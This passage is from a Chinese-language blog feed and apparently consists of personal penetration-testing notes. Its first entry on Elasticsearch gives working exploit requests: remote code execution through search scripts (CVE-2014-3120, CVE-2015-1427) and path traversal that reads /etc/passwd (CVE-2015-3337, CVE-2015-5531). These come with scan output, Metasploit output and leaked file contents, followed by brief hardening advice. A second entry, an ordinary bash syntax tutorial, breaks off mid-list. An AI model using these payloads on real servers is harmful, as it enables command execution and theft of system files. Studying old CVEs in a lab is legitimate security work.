        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p><code>Elasticsearch</code>是一个使用java开发的基于Lucene库的开源的高扩展的分布式全文搜索引擎。<br>它可以近乎实时存储、检索数据,具有HTTP Web接口和无模式JSON文档。</p><p>默认端口：</p><ul><li><code>9200</code> http端口</li><li><code>9300</code> 数据传输端口</li><li><code>组播端口(UDP)</code> 54328</li></ul><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/rest-apis.html">Elasticsearch API</a></p><h1 id="Infomation"><a href="#Infomation" class="headerlink" title="Infomation"></a>Infomation</h1><p>CURL</p><pre><code class="zsh">curl http://10.200.88.6:9201 ｜ grep &quot;You Know, for Search&quot;</code></pre><p>Nmap</p><pre><code class="zsh"> nmap -Pn -T4  -sV -p 9201  10.200.88.6Nmap scan report for 10.200.88.6Host is up (0.059s latency).PORT     STATE SERVICE VERSION9200/tcp open  http    Elasticsearch REST API 5.6.10 (name: 10.200.88.6; cluster: mscp-elasticsearch; Lucene 6.6.1)Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds</code></pre><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/cat.html">cat API</a></p><pre><code class="zsh">GET /_cat/nodes?h=ip,port,heapPercent,name</code></pre><pre><code class="zsh">curl http://10.200.88.6:9201/_cat  # 查看cat的功能 /_cat/nodes/_cat/tasks/_cat/indices/_cat/indices/&#123;index&#125;curl &quot;http://10.200.88.6:9201/_cat/indices?v&quot;                  health status index                uuid                   pri rep docs.count docs.deleted store.size pri.store.sizegreen  open   onc_v1_lb-2020-12-17 Ik3EFySWRyC2Nufv99iYpA   3   1       2304            0    713.1kb        356.7kbgreen  open   onc_v1_lb-2021-01-02 ewkYI6EuR--3PtesQsfZag   3   1       2304            0    724.1kb        362.1kbgreen  open   test                 gQHpUySfQaep7vfWs0zJzg   3   1          2            0     13.9kb          6.9kbcurl http://10.200.88.6:9201/_nodes  # 查看节点数据&#123;&quot;_nodes&quot;:&#123;&quot;total&quot;:3,&quot;successful&quot;:3,&quot;failed&quot;:0&#125;,&quot;cluster_name&quot;:&quot;mscp-elasticsearch&quot;,&quot;nodes&quot;:&#123;&quot;-6isCA5RTaeItZlabhGf6A&quot;:&#123;&quot;name&quot;:&quot;10.200.88.8&quot;,&quot;transport_address&quot;:&quot;10.200.88.8:9301&quot;,&quot;host&quot;:&quot;10.200.88.8&quot;,&quot;ip&quot;:&quot;10.200.88.8&quot;,&quot;version&quot;:&quot;5.6.10&quot;,&quot;build_hash&quot;:&quot;b727a60&quot;,&quot;total_indexing_buffer&quot;:830360780,&quot;roles&quot;:[&quot;master&quot;,&quot;data&quot;,&quot;ingest&quot;],&quot;attributes&quot;:&#123;&quot;ml.max_open_jobs&quot;:&quot;10&quot;,&quot;ml.enabled&quot;:&quot;true&quot;&#125;,&quot;settings&quot;:&#123;&quot;cluster&quot;:&#123;&quot;name&quot;:&quot;mscp-elasticsearch&quot;&#125;&#123;&quot;type&quot;:&quot;set&quot;&#125;,&#123;&quot;type&quot;:&quot;set_security_user&quot;&#125;,&#123;&quot;type&quot;:&quot;sort&quot;&#125;,&#123;&quot;type&quot;:&quot;split&quot;&#125;,&#123;&quot;type&quot;:&quot;trim&quot;&#125;,&#123;&quot;type&quot;:&quot;uppercase&quot;&#125;,&#123;&quot;type&quot;:&quot;user_agent&quot;&#125;]&#125;</code></pre><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="创建一条测试数据"><a href="#创建一条测试数据" class="headerlink" title="创建一条测试数据"></a>创建一条测试数据</h3><p>该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据</p><pre><code class="zsh">curl -X POST &quot;http://10.200.88.6:9201/website/blog&quot;  -d &#39;&#123;&quot;name&quot;:&quot;test&quot;&#125;&#39;&#123;&quot;_index&quot;:&quot;website&quot;,&quot;_type&quot;:&quot;blog&quot;,&quot;_id&quot;:&quot;AXbXVwBUIRRtVWWNffFo&quot;,&quot;_version&quot;:1,&quot;result&quot;:&quot;created&quot;,&quot;_shards&quot;:&#123;&quot;total&quot;:2,&quot;successful&quot;:2,&quot;failed&quot;:0&#125;,&quot;created&quot;:true&#125;</code></pre><pre><code class="zsh">curl -X POST &quot;http://10.200.88.6:9201/_search?pretty&quot;  -d &#39;&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;script&quot;: &quot;1+665&quot;&#125;&#125;&#125;&#39; -v&#123;  &quot;took&quot; : 5,  &quot;timed_out&quot; : false,  &quot;_shards&quot; : &#123;    &quot;total&quot; : 102,    &quot;successful&quot; : 102,    &quot;skipped&quot; : 0,    &quot;failed&quot; : 0  &#125;,  &quot;hits&quot; : &#123;    &quot;total&quot; : 68637,    &quot;max_score&quot; : 1.0,    &quot;hits&quot; : [      &#123;        &quot;_index&quot; : &quot;onc_v1_lb-2020-12-08&quot;,        &quot;_type&quot; : &quot;vperf&quot;,        &quot;_id&quot; : &quot;AXY97qwJP4DeVVFFFPWX&quot;,        &quot;_score&quot; : 1.0,        &quot;fields&quot; : &#123;          &quot;lupin&quot; : [            666          ]        &#125;      &#125;    ]  &#125;&#125;</code></pre><h3 id="ElasticSearch-命令执行漏洞CVE-2014-3120"><a href="#ElasticSearch-命令执行漏洞CVE-2014-3120" class="headerlink" title="ElasticSearch 命令执行漏洞CVE-2014-3120"></a>ElasticSearch 命令执行漏洞CVE-2014-3120</h3><pre><code class="zsh">curl -X POST &quot;http://10.200.88.6:9201/_search?pretty&quot;  -d &#39;&#123;                                                  &quot;size&quot;: 1,    &quot;query&quot;: &#123;      &quot;filtered&quot;: &#123;        &quot;query&quot;: &#123;          &quot;match_all&quot;: &#123;          &#125;        &#125;      &#125;    &#125;,    &quot;script_fields&quot;: &#123;        &quot;command&quot;: &#123;            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;        &#125;    &#125;&#125;&#39;</code></pre><h3 id="ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞CVE-2015-1427"><a href="#ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞CVE-2015-1427" class="headerlink" title="ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞CVE-2015-1427"></a>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞CVE-2015-1427</h3><pre><code class="zsh">curl -X POST &quot;http://10.200.88.6:9201/_search?pretty&quot;  -d &#39;&#123;                                            &quot;size&quot;:1,   &quot;script_fields&quot;:&#123;      &quot;lupin&quot;:&#123;         &quot;lang&quot;:&quot;groovy&quot;,         &quot;script&quot;:&quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;      &#125;   &#125;&#125;&#39;</code></pre><h3 id="ElasticSearch-目录穿越漏洞CVE-2015-3337"><a href="#ElasticSearch-目录穿越漏洞CVE-2015-3337" class="headerlink" title="ElasticSearch 目录穿越漏洞CVE-2015-3337"></a>ElasticSearch 目录穿越漏洞CVE-2015-3337</h3><pre><code class="zsh">curl -X GET &quot;http://10.200.88.6:9201/_plugin/head/../../../../../../../../../etc/passwd&quot;  -v</code></pre><h3 id="ElasticSearch-目录穿越漏洞CVE-2015-5531"><a href="#ElasticSearch-目录穿越漏洞CVE-2015-5531" class="headerlink" title="ElasticSearch 目录穿越漏洞CVE-2015-5531"></a>ElasticSearch 目录穿越漏洞CVE-2015-5531</h3><h4 id="MSF模块利用"><a href="#MSF模块利用" class="headerlink" title="MSF模块利用"></a>MSF模块利用</h4><pre><code class="zsh">Module options (auxiliary/scanner/http/elasticsearch_traversal):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   DEPTH     7                yes       Traversal depth   FILEPATH  /etc/passwd      yes       The path to the file to read   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS    192.168.108.223  yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT     9200             yes       The target port (TCP)   SSL       false            no        Negotiate SSL/TLS for outgoing connections   THREADS   1                yes       The number of concurrent threads (max one per host)   VHOST                      no        HTTP server virtual host192.168.108.223:default auxiliary(scanner/http/elasticsearch_traversal) &gt; run[*] The target appears to be vulnerable.[+] File saved in: /Users/ethan/.msf4/loot/20210107091740_default_192.168.108.223_elasticsearch.tr_989389.txt[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed192.168.108.223:default auxiliary(scanner/http/elasticsearch_traversal) &gt; cat /Users/ethan/.msf4/loot/20210107091740_default_192.168.108.223_elasticsearch.tr_989389.txt[*] exec: cat /Users/ethan/.msf4/loot/20210107091740_default_192.168.108.223_elasticsearch.tr_989389.txtroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologin</code></pre><h4 id="curl利用"><a href="#curl利用" class="headerlink" title="curl利用"></a>curl利用</h4><ol><li><p>新建一个仓库</p><pre><code class="zsh">curl -X POST &quot;http://192.168.79.28:9200/_snapshot/test&quot; -d &#39;&#123;                                         &quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;     &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test&quot;  &#125;&#125;&#39;&#123;&quot;acknowledged&quot;:true&#125;</code></pre></li><li><p>创建一个快照</p><pre><code class="zsh">curl -X POST &quot;http://192.168.79.28:9200/_snapshot/test2&quot; -d &#39;&#123; &quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;     &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test/snapshot-backdata&quot;  &#125;&#125;&#39;&#123;&quot;acknowledged&quot;:true&#125;</code></pre></li><li><p>目录穿越读取任意文件</p></li></ol><p><a href="https://www.exploit-db.com/exploits/38383/">POC</a></p><pre><code class="zsh">curl -X GET &quot;http://192.168.79.28:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&quot; &#123;&quot;error&quot;:&quot;ElasticsearchParseException[Failed to derive xcontent from (offset=0, length=919): [114, 111, 111, 116, 58, 120, 58, 48, 58, 48, 58, 114, 111, 111, 116, 58, 47, 114, 111, 111, 116, 58, 47, 98, 105, 110, 47, 98, 97, 115, 104, 10, 100, 97, 101, 109, 111, 110, 58, 120, 58, 49, 58, 49, 58, 100, 97, 101, 109, 111, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 98, 105, 110, 58, 120, 58, 50, 58, 50, 58, 98, 105, 110, 58, 47, 98, 105, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 115, 121, 115, 58, 120, 58, 51, 58, 51, 58, 115, 121, 115, 58, 47, 100, 101, 118, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 115, 121, 110, 99, 58, 120, 58, 52, 58, 54, 53, 53, 51, 52, 58, 115, 121, 110, 99, 58, 47, 98, 105, 110, 58, 47, 98, 105, 110, 47, 115, 121, 110, 99, 10, 103, 97, 109, 101, 115, 58, 120, 58, 53, 58, 54, 48, 58, 103, 97, 109, 101, 115, 58, 47, 117, 115, 114, 47, 103, 97, 109, 101, 115, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 109, 97, 110, 58, 120, 58, 54, 58, 49, 50, 58, 109, 97, 110, 58, 47, 118, 97, 114, 47, 99, 97, 99, 104, 101, 47, 109, 97, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 108, 112, 58, 120, 58, 55, 58, 55, 58, 108, 112, 58, 47, 118, 97, 114, 47, 115, 112, 111, 111, 108, 47, 108, 112, 100, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 109, 97, 105, 108, 58, 120, 58, 56, 58, 56, 58, 109, 97, 105, 108, 58, 47, 118, 97, 114, 47, 109, 97, 105, 108, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 110, 101, 119, 115, 58, 120, 58, 57, 58, 57, 58, 110, 101, 119, 115, 58, 47, 118, 97, 114, 47, 115, 112, 111, 111, 108, 47, 110, 101, 119, 115, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 117, 117, 99, 112, 58, 120, 58, 49, 48, 58, 49, 48, 58, 117, 117, 99, 112, 58, 47, 118, 97, 114, 47, 115, 112, 111, 111, 108, 47, 117, 117, 99, 112, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 112, 114, 111, 120, 121, 58, 120, 58, 49, 51, 58, 49, 51, 58, 112, 114, 111, 120, 121, 58, 47, 98, 105, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 119, 119, 119, 45, 100, 97, 116, 97, 58, 120, 58, 51, 51, 58, 51, 51, 58, 119, 119, 119, 45, 100, 97, 116, 97, 58, 47, 118, 97, 114, 47, 119, 119, 119, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 98, 97, 99, 107, 117, 112, 58, 120, 58, 51, 52, 58, 51, 52, 58, 98, 97, 99, 107, 117, 112, 58, 47, 118, 97, 114, 47, 98, 97, 99, 107, 117, 112, 115, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 108, 105, 115, 116, 58, 120, 58, 51, 56, 58, 51, 56, 58, 77, 97, 105, 108, 105, 110, 103, 32, 76, 105, 115, 116, 32, 77, 97, 110, 97, 103, 101, 114, 58, 47, 118, 97, 114, 47, 108, 105, 115, 116, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 105, 114, 99, 58, 120, 58, 51, 57, 58, 51, 57, 58, 105, 114, 99, 100, 58, 47, 118, 97, 114, 47, 114, 117, 110, 47, 105, 114, 99, 100, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 103, 110, 97, 116, 115, 58, 120, 58, 52, 49, 58, 52, 49, 58, 71, 110, 97, 116, 115, 32, 66, 117, 103, 45, 82, 101, 112, 111, 114, 116, 105, 110, 103, 32, 83, 121, 115, 116, 101, 109, 32, 40, 97, 100, 109, 105, 110, 41, 58, 47, 118, 97, 114, 47, 108, 105, 98, 47, 103, 110, 97, 116, 115, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 110, 111, 98, 111, 100, 121, 58, 120, 58, 54, 53, 53, 51, 52, 58, 54, 53, 53, 51, 52, 58, 110, 111, 98, 111, 100, 121, 58, 47, 110, 111, 110, 101, 120, 105, 115, 116, 101, 110, 116, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 95, 97, 112, 116, 58, 120, 58, 49, 48, 48, 58, 54, 53, 53, 51, 52, 58, 58, 47, 110, 111, 110, 101, 120, 105, 115, 116, 101, 110, 116, 58, 47, 98, 105, 110, 47, 102, 97, 108, 115, 101, 10]]&quot;,&quot;status&quot;:400&#125;</code></pre><p>对十进制整数进行解码即可<br><a href="https://tool.leavesongs.com/">解码平台</a></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li>限制IP访问，绑定固定IP</li><li>在config/elasticsearch.yml中为9200端口设置认证：<pre><code class="zsh">　　http.basic.enabled true #开关，开启会接管全部HTTP连接　　http.basic.user &quot;admin&quot; #账号　　http.basic.password &quot;admin_pw&quot; #密码　　http.basic.ipwhitelist [&quot;localhost&quot;, &quot;127.0.0.1&quot;]</code></pre></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bash_basic</title>
      <link href="Coding/bash-basic.html"/>
      <url>Coding/bash-basic.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="编程基本元素"><a href="#编程基本元素" class="headerlink" title="编程基本元素"></a>编程基本元素</h1><h2 id="I-O"><a href="#I-O" class="headerlink" title="I/O"></a>I/O</h2><pre><code class="zsh">VAR=&quot;string&quot; # 声明变量之间不能带有空格read MYVAR  # inputCMDOUT=$(pwd)  # 将pwd命令的输出保存到CMDOUT中echo &quot;$MYVAR&quot;  # outputprintf &quot;$VAR&quot;  # output</code></pre><h3 id="输入read命令"><a href="#输入read命令" class="headerlink" title="输入read命令"></a>输入<code>read命令</code></h3><ul><li>a 后跟一个变量，该变量会被认为是个数组，然后给其赋值，默认是以空格为分割符。</li><li>d 后面跟一个标志符，其实只有其后的第一个字符有用，作为结束的标志。</li><li>p 后面跟提示信息，即在输入前打印提示信息。</li><li>e 在输入的时候可以使用命令补全功能。</li><li>n 后跟一个数字，定义输入文本的长度，很实用。</li><li>r 屏蔽\，如果没有该选项，则\作为一个转义字符，有的话 \就是个正常的字符了。</li><li>s 安静模式，在输入字符时不再屏幕上显示，例如login时输入密码。</li><li>t 后面跟秒数，定义输入字符的等待时间。</li><li>u 后面跟fd，从文件描述符中读入，该文件描述符可以是exec新开启的。 )</li></ul><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><h4 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a>echo命令</h4><p> echo显示颜色<br><img src="http://c.biancheng.net/uploads/allimg/180926/3-1P926164539348.jpg" alt="echo显示颜色"></p><pre><code class="zsh">echo [-ne E] [String]-E : (默认)转义,不解释参数中的转义符-e : 不转义,解释参数中的转义符-n : 打印内容不换行</code></pre><ul><li><code>String</code> 中的转义符(由echo命令解释)<ul><li><code>\a</code> : 告警</li><li><code>\b</code> : 退格</li><li><code>\c</code> : 忽略输出中最后的换行符</li><li><code>\f</code> : 换页</li><li><code>\n</code> : 回车换行(Newline)</li><li><code>\r</code> : 回车</li><li><code>\t</code> : 水平制表符</li><li><code>\v</code> : 垂直制表符</li><li><code>\\</code> : 反斜线</li></ul></li></ul><h4 id="printf"><a href="#printf" class="headerlink" title="printf"></a><code>printf</code></h4><pre><code class="zsh">printf &quot;&lt;foramtString&gt;&quot; arg1 arg2 ...</code></pre><ul><li><p><code>formatString</code> : 待输出的字符串</p></li><li><p><code>格式规范 %[flags][width][.precision]&lt;type&gt;</code></p><ol><li><code>flags</code> : <code>+ - # &lt;space&gt;</code></li></ol><ul><li><code>+</code> : 在整数前加+/-</li><li><code>-</code> : 使用<code>width</code>时,表示输出数值左对齐</li><li><code>#</code> : 输出(八进制标识符)<code>0</code> 和(十六进制标识符)<code>0x</code>或<code>0X</code></li><li><code>&lt;space&gt;</code> : 空格,起对齐作用在打印正数前面加上一个空格,打印负数前面加上<code>-</code>。</li></ul><ol start="2"><li><p><code>width</code> 指定输出参数时最小字段宽度<num>, 对应的参数默认采用右对齐的形式 </p></li><li><p><code>.precision</code> : 表示整数的最小位数,字符串的最大字符数,<code>*</code>代表使用下一个参数作为精度</p></li><li><p><code>type</code> </p></li></ol><ul><li><p><code>%d</code> : 整数</p></li><li><p><code>%u</code> : 无符号整数</p></li><li><p><code>%o</code> : 八进制整数</p></li><li><p><code>%x</code> : 十六进制整数(a-f)</p></li><li><p><code>%X</code> : 十六进制整数(A~F)</p></li><li><p><code>%c</code> : 单个字符</p></li><li><p><code>%s</code> : 字符串字面量</p></li><li><p><code>%b</code> : 包含转义字符的字符串</p></li><li><p><code>%%</code> : 百分号</p></li></ul></li></ul><h3 id="多行输出"><a href="#多行输出" class="headerlink" title="多行输出"></a>多行输出</h3><ul><li>不转义输出<pre><code class="zsh">cat &lt;&lt;EOF     # date命令会执行Line1`date`Line3EOF</code></pre></li></ul><ul><li>转义输出<pre><code class="zsh">cat &lt;&lt;\EOF    # date命令原样输出Line1`date`Line3EOF</code></pre></li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量名(字母、数字、下划线)由[a-z]、[A-Z]、<code>_</code>、[0-9]组合，且开头不能是[0-9]</p><blockquote><p>变量本质上是存储数据的一个或多个计算机内存地址</p></blockquote><h3 id="变量操作"><a href="#变量操作" class="headerlink" title="变量操作"></a>变量操作</h3><pre><code class="zsh">var=value   # 等号两边不能有空格 var=`command argument` # 变量名var=1  # 设置变量unset var  # 清除变量var=2readonly var #设置var为只读变量</code></pre><h3 id="变量间接引用eval"><a href="#变量间接引用eval" class="headerlink" title="变量间接引用eval"></a>变量间接引用<code>eval</code></h3><p>eval 使shell对args求值, 然后执行求职结果。常用于从变量中构造命令行</p><p>变量适用条件：</p><ul><li> 含有命令终止符: <code>;、|、&amp;</code></li><li> 含有I/O重定向: <code>&lt;、&gt;</code></li><li> 引号: <code>&#39;、&quot;</code></li></ul><pre><code class="zsh">x=&quot;askding&quot;askding_url=&quot;askding.github.io&quot;eval echo \$$&#123;x&#125;_url</code></pre><h4 id="间接参数扩展-var"><a href="#间接参数扩展-var" class="headerlink" title="间接参数扩展 ${!var}"></a>间接参数扩展 ${!var}</h4><pre><code class="bash">parameter=&quot;var&quot;var=&quot;hello&quot;echo $&#123;!parameter&#125;hello</code></pre><h3 id="shell参数扩展-空参数处理"><a href="#shell参数扩展-空参数处理" class="headerlink" title="shell参数扩展- 空参数处理"></a>shell参数扩展- 空参数处理</h3><p><code>$&#123;var1:-var2&#125;</code> 等价于 <code>(!isSet(va1) || var1 == NULL)</code><br>即 判断var1为unset或者var1为NULL<br>参数扩展：取得var代表的变量的值</p><ul><li><code>$&#123;var-word&#125;</code> : var存在(可为空),就是var,不存在就是word</li><li><code>$&#123;var=word&#125;</code> : var存在(可为空),就是var,不存在就是word, var也是word。</li><li><code>$&#123;var+word&#125;</code> : var存在(可为空),就是var,不存在就是空</li><li><code>$&#123;var?word&#125;</code> : var存在(可为空),就是var, 不存在将word写入到标准错误并退出</li></ul><blockquote><p>:表示var非空</p></blockquote><ul><li><p><code>$&#123;var:-word&#125;</code> :   var存在非空就是var，不存在就是word</p><ul><li>若var存在且非空,则${}=$var</li><li>若var未定义或为空值, ${}=word，$var不变</li></ul></li><li><p><code>$&#123;var:=word&#125;</code> :   var存在非空就是var，不存在就是word，var也是word</p><ul><li>若var存在且非空, ${}=$var</li><li>若var未定义或为空值,${}=word, 且$var=word</li></ul></li><li><p><code>$&#123;var:+word&#125;</code> :   var存在非空就是var，不存在就是空</p><ul><li>若var存在且非空, ${}=word</li><li>若var未定义或为空值, ${}为空，$var不变</li></ul></li><li><p><code>$&#123;var:?word&#125;</code> :    var存在就非空是var，不存在打印word并终止</p><ul><li>若var存在且非空, ${}=$var</li><li>若var未定义或为空值, 输出word,并终止脚本</li></ul></li></ul><blockquote><p>:表示var非空<br>未定义 表示未执行var=xxx 或set var=xxx<br>为NULL 表示 set var</p></blockquote><ol><li>指定默认值</li></ol><ul><li><code>$&#123;VAR:=WORD&#125;</code> 当VAR未定义(set) 给VAR赋默认值WORD, 结果也为WORD</li><li><code>$&#123;VAR=WORD&#125;</code>  当VAR未定义(set)或为空，给VAR赋默认值WORD, 结果也为WORD</li></ul><ol start="2"><li>使用默认值</li></ol><ul><li><code>$&#123;VAR:-WORD&#125;</code> 当VAR未定义(set),或为NULL，结果为WORD</li><li><code>$&#123;VAR-WORD&#125;</code> 当VAR未定义(set) ， 则结果为WORD </li></ul><ol start="3"><li>使用替代值</li></ol><ul><li><code>$&#123;VAR:+WORD&#125;</code> 当VAR未定义,或为空, 则结果为空;</li><li><code>$&#123;VAR+WORD&#125;</code>  当VAR未定义,或为空, 则结果为空;<br>当VAR被set且赋不为空值时，则会使用WORD</li></ul><h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><ul><li><p><code>$&#123;#var&#125;</code> : 返回${var}变量的长度</p></li><li><p><code>$&#123;var:m&#125;</code> : 返回${var}中第m个字符开始到结尾部分(从0开始计算)</p></li><li><p><code>$&#123;var:m:len&#125;</code> : 返回${var}中第m个字符开始，长度位len的部分</p></li><li><p><code>$&#123;var#pattern&#125;</code> : 删除${var}中开头部分与pattern匹配的部分(非贪婪模式)</p></li><li><p><code>$&#123;var##pattern&#125;</code> : 删除${var}中开头部分与pattern匹配的部分(贪婪模式)</p></li><li><p><code>$&#123;var%pattern&#125;</code> : 删除${var}中结尾部分与pattern匹配的部分(非贪婪模式)</p></li><li><p><code>$&#123;var%%pattern&#125;</code> : 删除${var}中结尾部分与pattern匹配的部分(贪婪模式)</p></li><li><p><code>$&#123;var/old/new&#125;</code> : 用new替换${var}中第一次出现的old</p></li><li><p><code>$&#123;var//old/new&#125;</code> : 用new替换${var}中所有old(全局替换)</p></li><li><p><code>$&#123;var/#old/new&#125;</code> : 用new替换${var}中开头部分与old匹配的部分</p></li><li><p><code>$&#123;var/%old/new&#125;</code> : 用new替换${var}中结尾部分与old匹配的部分</p></li></ul><h2 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h2><ul><li>整数索引的数字 <code>Arrary[index]</code> 可直接使用变量名创建</li><li>关联(字符串)数组 <code>Colors[&quot;red&quot;]=&quot;#FF0000&quot;</code> 必须使用<code>declare -A</code>声明创建</li></ul><h3 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h3><pre><code class="zsh">ARRAY[index]=value   # index为算数表达式,或(0,1,2,...)的整数ARRAY=(Value1 Value2 Value3 [5]=Vlaue5 ...)   # 第三、四元素为空字符串&quot;&quot;declare -a Array_name # 声明Array_name是一个数组read -a Array_name    # 将用户的命令行输入,当成Array_name的数组元素,以空格符分隔符</code></pre><h3 id="读取数组"><a href="#读取数组" class="headerlink" title="读取数组"></a>读取数组</h3><pre><code class="zsh">echo $&#123;array[index]&#125;            # 打印单个数组成员echo $&#123;array[@]&#125; $&#123;array[*]&#125;    # 打印所有成员,推荐使用`&quot;$&#123;array[@]&#125;&quot;`array_copy=( &quot;$&#123;array[@]&#125;&quot; )    # 拷贝数组</code></pre><h3 id="数组长度"><a href="#数组长度" class="headerlink" title="数组长度"></a>数组长度</h3><pre><code class="zsh">echo $&#123;#array[@]&#125; $&#123;#array[*]&#125;    # 打印数组长度echo $&#123;#array&#125;                    #打印第一个成员的长度echo $&#123;#array[i]&#125;                 # 打印指定成员长度 </code></pre><h3 id="打印数组序号"><a href="#打印数组序号" class="headerlink" title="打印数组序号"></a>打印数组序号</h3><pre><code class="zsh">echo $&#123;!array[@]&#125;  $&#123;!array[*]&#125;  </code></pre><h3 id="打印数组成员-数组切片"><a href="#打印数组成员-数组切片" class="headerlink" title="打印数组成员(数组切片)"></a>打印数组成员(数组切片)</h3><pre><code class="zsh">echo $&#123;array[@]:position:lens&#125;   $&#123;array[*]:position:lens&#125; # position从0开始# lens为长度，不指定，返回从position开始的所有成员</code></pre><h3 id="追加数组成员"><a href="#追加数组成员" class="headerlink" title="追加数组成员"></a>追加数组成员</h3><pre><code class="zsh">array=(a b c)array+=(d e f)    # 利用+=可以追加数组元素echo $&#123;array[@]&#125;</code></pre><h3 id="删除数组及成员"><a href="#删除数组及成员" class="headerlink" title="删除数组及成员"></a>删除数组及成员</h3><pre><code class="zsh">unset array     # 清空整个数组array[i]=&#39;&#39;     #隐藏第i+i个元素,设为空值=&#39;&#39;</code></pre><h2 id="shell内部变量"><a href="#shell内部变量" class="headerlink" title="shell内部变量"></a>shell内部变量</h2><ul><li><code>#</code> : 位置参数的个数</li><li><code>?</code> : 上条命令执行后的返回值</li><li><code>$</code> : 当前shell进程的PID</li><li><code>!</code> : 最后一个后台运行命令的PID</li><li><code>0</code> : 当前执行的shell程序的名称</li><li><code>@</code> : 位置参数的内容</li><li><code>*</code> : 位置参数的内容,受<code>IFS</code>影响</li><li><code>_</code> : shell启动时,为正在运行shell程序的绝对路径。shell结束后为上一条命令的最后一个参数 </li></ul><h2 id="内部特殊参数"><a href="#内部特殊参数" class="headerlink" title="内部特殊参数"></a>内部特殊参数</h2><p>每个参数由空格符分隔，并在bash中使用一组特殊的标识符$[num]进行访问。</p><ul><li><p>$0 : 表示命令行输入的脚本名称</p></li><li><p>$1 : 第一个参数</p></li><li><p>$n : 第n个参数</p></li><li><p>$# : 参数的个数,不包括$0</p></li><li><p>$@ : 